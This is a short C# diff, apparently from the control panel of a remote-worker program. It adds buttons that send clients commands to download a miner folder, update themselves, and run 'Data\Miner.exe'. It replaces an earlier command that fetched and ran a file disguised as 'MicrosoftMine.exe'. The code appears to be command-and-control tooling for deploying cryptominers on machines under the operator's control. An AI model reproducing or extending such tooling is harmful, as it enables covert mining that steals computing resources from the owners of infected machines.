@@ -59,7 +59,18 @@ namespace ServerWorker
 
         private void button3_Click(object sender, EventArgs e)
         {
-            string message = "DownloadAndRun"+"_"+"MicrosoftMine.exe";
+            string message = "DownloadFloader" + "_"+"Miner" + "_" + "Data";
+            messenger.SendMessage(message);
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            messenger.Update();
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            string message = "RunProgram" + "_" + @"Data\Miner.exe";
             messenger.SendMessage(message);
         }
     }
